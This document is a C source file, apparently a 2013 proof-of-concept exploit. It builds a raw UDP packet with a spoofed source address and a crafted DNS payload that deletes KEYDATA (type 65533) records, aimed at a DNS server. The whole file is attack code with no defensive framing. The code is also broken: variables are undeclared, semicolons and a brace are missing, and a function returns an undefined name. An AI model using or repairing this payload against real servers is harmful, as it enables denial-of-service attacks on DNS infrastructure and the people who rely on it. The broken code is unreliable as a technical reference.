/* 2013 */

#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

struct ip_header
{
    u_int ihl:4, version: 4;
    u_char tos;
    u_char ttl;
    u_char protocol;
    u_long saddr;
    u_long daddr;
    u_short tot_len;
    u_short id;
    u_short frag_off;
    u_short check;
};

struct udp_header
{
    u_short sport;
    u_short dport;
    u_short len;
    u_short check;
};

struct pseudo_header
{
    u_int saddr;
    u_int daddr;
    u_char zero;
    u_char protocol;
    u_short len;
    struct udp_header udp;
}

unsigned short
cksum(u_short *addr, int len)
{
    int nleft = len;
    int sum = 0x0;
    u_short *w = addr;
    u_short ans = 0x0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1)
    {
        *(u_char *)(&ans) = *(u_char *)w;
        sum += ans;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    ans = ~sum;
    return answer;
}

unsigned int
host2ip(char *hostname)
{
    static struct in_addr i;
    struct hostent *h;

    if((i.s_addr = inet_addr(hostname)) == -1)
        if((h = gethostbyname(hostname)) == NULL)
            exit(1);
        bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
    }
}

int main(int argc, char const *argv[])
{
    char *saddr = "192.168.1.130";
    char *daddr = "192.168.1.128";
    char *dport = "53333";
    char buf[1500];

    struct sockaddr_in sin;
    struct ip_header *ip;
    struct udp_header *udp;
    char payload[] =
        // dns payload, rfc 1035
        // header section
        "\xff\xff"          // ID for request                    (16bit)
        "\x28\x00"          // \x28\x00 QR query/response        (1bit)
                            // OPCODE 0 = standard query         (4bit)
                            //        1 = inverse query
                            //        2 = server status request
                            //     3-15 = reserved
                            // AA authoritative answer false/true(1bit)
                            // TC truncation false/true          (1bit)
                            // RD recursion desidered false/true (1bit)
                            // RA recursion available false/true (1bit)
                            // Z  reserved                       (3bit)
                            // RCODE 0 = no error                (4bit)
                            //       1 = format error
                            //       2 = server failure
                            //       3 = name error
                            //       4 = not implemented
                            //       5 = refused
                            //    6-15 = reserved
        "\x00\x01"          // QDCOUNT number of questions      u(16bit)
        "\x00\x00"          // ANCOUNT number of answers        u(16bit)
        "\x00\x02"          // \x00\x02 NSCOUNT number of NS RR u(16bit)
        "\x00\x00"          // ARCOUNT number of additional rr  u(16bit)
        // question section
        "\x07testest"     // QNAME (length of string + string)
        "\x02it"
        "\x00"            // NULL octet, end of this QNAME
        "\x00\x06"        // QTYPE  1:A      2:NS     3:MD     4:MF
                          //        5:CNAME  6:SOA    7:MB     8:MG
                          //        9:MR    10:NULL  11:WKS   12:PTR
                          //       13:HINFO 14:MINFO 15:MX    16:TXT
        "\x00\x01"        // QCLASS 1:IN     2:CS     3:CH     4:HS
        // rdata zone
        "\xc0\x0c"        // \xc0\x0c DELETE
        "\xff\xfd"        // \x00\x01 QTYPE rrset to delete KEYDATA 65533
        "\x00\xff"        // \x00\xff QCLASS rrset to delete UNUSED
        "\x00\x00"        // \x00\x00
        "\x00\x00"
        "\x00\x00"
        "\xc0\x0c"        // \xc0\x0c DELETE
        "\xff\xfd"        // \x00\x01 QTYPE rrset to delete KEYDATA 65533
        "\x00\x01"        // \x00\xff QCLASS rrset to delete UNUSED
        "\x00\x00"        // \x00\x00
        "\x00\x0a"
        "\x00\x04"
        "\x41\x41\x41\x41";

    if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        exit(1);

    spoof = host2ip(saddr);
    target = host2ip(daddr);
    port = atoi(dport);
    ip = (void *)buf;
    udp = (void *)(buf + sizeof(struct ip_header));
    str = (void *)(buf + sizeof(struct ip_header) + sizeof(struct udp_header));
    memset(str, 10, 1500 - (sizeof(struct ip_header) + sizeof(struct udp_header)));

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = 1500;
    ip->frag_off = 0;
    ip->protocol = 17;
    ip->ttl = 64;
    ip->saddr = spoof;
    ip->daddr = target;
    ip->id = 12345;
    ip->check = cksum((u_short *)buf, 1500);
    udp->sport = 53535;
    udp->dport = port
    udp->len = 1500;
    udp->check = cksum((u_short *)buf, 1500);
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = target;
    sin.sin_port = udp->dport;

    sendto(s, buf, 1500, 0, (struct sockaddr *)&sin, sizeof(sin));
}
